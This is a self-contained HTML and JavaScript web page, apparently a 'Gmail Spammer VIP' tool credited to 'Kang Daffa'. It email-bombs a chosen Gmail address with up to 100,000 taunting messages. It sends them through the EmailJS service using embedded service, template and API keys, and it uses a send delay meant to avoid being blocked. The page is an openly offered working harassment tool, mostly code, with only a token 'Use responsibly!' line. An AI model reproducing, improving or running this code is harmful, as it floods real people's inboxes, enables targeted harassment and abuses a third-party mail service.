<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GMAIL SPAMMER VIP</title>
    <link href="https://fonts.googleapis.com/css2?family=Eczar:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #000;
            font-family: Arial, sans-serif;
            overflow-x: hidden;
        }

        /* Intro Screen */
        .intro-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            transition: all 2s ease;
        }

        .intro-image {
            width: 80%;
            max-width: 500px;
            height: auto;
            border-radius: 20px;
            border: 5px solid #ff0000;
            box-shadow: 0 0 50px #ff0000;
            animation: spin 3s linear infinite, glow 2s ease-in-out infinite alternate;
        }

        @keyframes spin {
            0% { transform: rotate(0deg) scale(1); }
            50% { transform: rotate(180deg) scale(1.1); }
            100% { transform: rotate(360deg) scale(1); }
        }

        @keyframes glow {
            0% { box-shadow: 0 0 30px #ff0000; }
            100% { box-shadow: 0 0 60px #ff0000, 0 0 80px #ff0000; }
        }

        /* Mini Icon */
        .mini-icon {
            position: fixed;
            bottom: 20px;
            left: 20px;
            width: 60px;
            height: 60px;
            border-radius: 50%;
            border: 2px solid #ff0000;
            box-shadow: 0 0 20px #ff0000;
            animation: miniSpin 4s linear infinite, miniGlow 1.5s ease-in-out infinite alternate;
            z-index: 999;
        }

        @keyframes miniSpin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @keyframes miniGlow {
            0% { box-shadow: 0 0 10px #ff0000; }
            100% { box-shadow: 0 0 25px #ff0000, 0 0 35px #ff0000; }
        }

        /* Main Content */
        .main-content {
            display: none;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            background: rgba(0, 0, 0, 0.9);
            border: 3px solid #ff0000;
            border-radius: 15px;
            padding: 30px;
            max-width: 800px;
            margin: 0 auto;
            box-shadow: 0 0 40px rgba(255, 0, 0, 0.5);
        }

        .title {
            color: #ff0000;
            font-size: 48px;
            font-weight: bold;
            text-align: center;
            margin-bottom: 10px;
            text-shadow: 2px 2px 10px rgba(255, 0, 0, 0.8);
            font-family: 'Eczar', serif;
            letter-spacing: 3px;
        }

        .credit {
            color: #ff0000;
            font-size: 18px;
            text-align: center;
            margin-bottom: 30px;
            text-shadow: 1px 1px 5px rgba(255, 0, 0, 0.6);
            font-weight: bold;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            color: #ff0000;
            margin-bottom: 8px;
            font-weight: bold;
            font-size: 16px;
        }

        input[type="email"],
        input[type="number"] {
            width: 100%;
            padding: 12px;
            border: 2px solid #ff0000;
            border-radius: 8px;
            background: #111;
            color: #fff;
            font-size: 16px;
            box-shadow: 0 0 10px rgba(255, 0, 0, 0.3);
        }

        input:focus {
            outline: none;
            box-shadow: 0 0 15px rgba(255, 0, 0, 0.6);
        }

        .spam-btn {
            width: 100%;
            padding: 15px;
            background: linear-gradient(45deg, #ff0000, #cc0000);
            color: #000;
            border: none;
            border-radius: 8px;
            font-size: 20px;
            font-weight: bold;
            cursor: pointer;
            margin: 20px 0;
            box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 2px;
        }

        .spam-btn:hover {
            transform: scale(1.02);
            box-shadow: 0 0 30px rgba(255, 0, 0, 0.8);
        }

        .spam-btn:active {
            transform: scale(0.98);
        }

        .terminal {
            background: #111;
            border: 2px solid #ff0000;
            border-radius: 8px;
            padding: 20px;
            height: 300px;
            overflow-y: auto;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            box-shadow: inset 0 0 20px rgba(255, 0, 0, 0.2);
        }

        .terminal-line {
            margin-bottom: 5px;
            animation: fadeIn 0.3s ease;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        .success { color: #00ff00; }
        .error { color: #ff0000; }
        .warning { color: #ffff00; }
        .info { color: #00ffff; }

        .fire-effect {
            position: fixed;
            bottom: 0;
            left: 0;
            width: 100%;
            height: 100px;
            background: linear-gradient(transparent, rgba(255, 0, 0, 0.3));
            pointer-events: none;
            z-index: -1;
        }

        /* Responsive */
        @media (max-width: 768px) {
            .title {
                font-size: 36px;
            }
            
            .container {
                padding: 20px;
                margin: 10px;
            }
            
            .mini-icon {
                width: 40px;
                height: 40px;
            }
        }
    </style>
</head>
<body>
    <!-- Intro Screen -->
    <div class="intro-screen" id="introScreen">
        <img src="https://files.catbox.moe/agmwj4.jpg" alt="Kang Daffa" class="intro-image">
    </div>

    <!-- Mini Icon -->
    <img src="https://files.catbox.moe/agmwj4.jpg" alt="Kang Daffa" class="mini-icon" id="miniIcon" style="display: none;">

    <!-- Main Content -->
    <div class="main-content" id="mainContent">
        <div class="fire-effect"></div>
        
        <div class="container">
            <h1 class="title">GMAIL SPAMMER VIP</h1>
            <div class="credit">CREATED BY KANG DAFFA</div>
            
            <form id="spamForm">
                <div class="form-group">
                    <label for="email">TARGET GMAIL:</label>
                    <input type="email" id="email" placeholder="example@gmail.com" required>
                </div>
                
                <div class="form-group">
                    <label for="count">HOW MANY SPAM:</label>
                    <input type="number" id="count" placeholder="100" min="1" max="100000" required>
                </div>
                
                <button type="submit" class="spam-btn">START SPAMMING</button>
            </form>
            
            <div class="terminal" id="terminal">
                <div class="terminal-line info">System ready...</div>
                <div class="terminal-line info">Gmail Spammer VIP activated</div>
                <div class="terminal-line warning">Use responsibly!</div>
            </div>
        </div>
    </div>

    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    
    <script>
        // EmailJS setup
        emailjs.init("H7WlzLgZwqVAqRG2M");
        
        const emailConfig = {
            serviceID: 'service_93wskl6',
            templateID: 'template_wtbthp2',  
            userID: 'H7WlzLgZwqVAqRG2M'
        };

        // Handle intro animation
        setTimeout(() => {
            const introScreen = document.getElementById('introScreen');
            const miniIcon = document.getElementById('miniIcon');
            const mainContent = document.getElementById('mainContent');
            
            // Shrink intro to mini icon
            introScreen.style.transition = 'all 1.5s ease';
            introScreen.style.transform = 'scale(0.1) translate(-450px, 200px)';
            introScreen.style.opacity = '0';
            
            // Show mini icon and main content
            setTimeout(() => {
                introScreen.style.display = 'none';
                miniIcon.style.display = 'block';
                mainContent.style.display = 'block';
            }, 1500);
            
        }, 5000); // 5 second intro

        // Fast spam function
        async function sendSpam(targetEmail, messageCount) {
            const terminal = document.getElementById('terminal');
            let successCount = 0;
            
            terminal.innerHTML += `<div class="terminal-line warning">Starting spam attack: ${messageCount} messages to ${targetEmail}</div>`;
            
            // Send emails in quick succession
            for (let i = 1; i <= messageCount; i++) {
                try {
                    const templateParams = {
                        to_email: targetEmail,
                        from_name: '@KANGDAFFA',
                        message: 'YOUR GMAIL GOT SPAMMED BY @KANGDAFFA',
                        subject: `SPAM ${i} - @KANGDAFFA`,
                        reply_to: 'gojah58@gmail.com'
                    };
                    
                    await emailjs.send(
                        emailConfig.serviceID, 
                        emailConfig.templateID, 
                        templateParams, 
                        emailConfig.userID
                    );
                    
                    successCount++;
                    
                    // Show progress every 10 messages or for first few
                    if (i % 10 === 0 || i <= 5) {
                        terminal.innerHTML += `<div class="terminal-line success">Sent ${i}/${messageCount}: ${targetEmail}</div>`;
                        terminal.scrollTop = terminal.scrollHeight;
                    }
                    
                    // Very short delay to make it fast but not get blocked
                    if (i < messageCount) {
                        await new Promise(resolve => setTimeout(resolve, 500));
                    }
                    
                } catch (error) {
                    terminal.innerHTML += `<div class="terminal-line error">Failed to send message ${i}</div>`;
                }
            }
            
            return successCount;
        }

        // Form handler
        document.getElementById('spamForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const targetEmail = document.getElementById('email').value;
            const messageCount = parseInt(document.getElementById('count').value);
            const button = this.querySelector('button');
            const terminal = document.getElementById('terminal');
            
            if (!targetEmail.includes('@gmail.com')) {
                terminal.innerHTML += `<div class="terminal-line error">Must be a Gmail address!</div>`;
                return;
            }
            
            if (messageCount > 100000) {
                terminal.innerHTML += `<div class="terminal-line error">Max 100000 messages!</div>`;
                return;
            }
            
            // Disable button
            button.disabled = true;
            button.textContent = 'SPAMMING...';
            
            // Clear terminal and show start message
            terminal.innerHTML = `<div class="terminal-line info">Starting mass spam attack...</div>`;
            
            const startTime = Date.now();
            const successCount = await sendSpam(targetEmail, messageCount);
            const endTime = Date.now();
            const timeTaken = ((endTime - startTime) / 1000).toFixed(1);
            
            // Show results
            terminal.innerHTML += `
                <div class="terminal-line success">=== SPAM COMPLETE ===</div>
                <div class="terminal-line info">Sent: ${successCount}/${messageCount} messages</div>
                <div class="terminal-line info">Time: ${timeTaken} seconds</div>
                <div class="terminal-line warning">${targetEmail} got destroyed by @KANGDAFFA!</div>
            `;
            
            terminal.scrollTop = terminal.scrollHeight;
            
            // Re-enable button
            button.disabled = false;
            button.textContent = 'START SPAMMING';
        });

        // Add some random terminal messages for effect
        const messages = [
            "System armed and ready",
            "Gmail API connected", 
            "Spam engine warmed up",
            "Ready to destroy some inboxes",
            "@KANGDAFFA power activated"
        ];
        
        setInterval(() => {
            const terminal = document.getElementById('terminal');
            if (terminal.children.length < 10) {
                const randomMsg = messages[Math.floor(Math.random() * messages.length)];
                terminal.innerHTML += `<div class="terminal-line info">${randomMsg}</div>`;
                terminal.scrollTop = terminal.scrollHeight;
            }
        }, 8000);
    </script>
</body>
    </html>
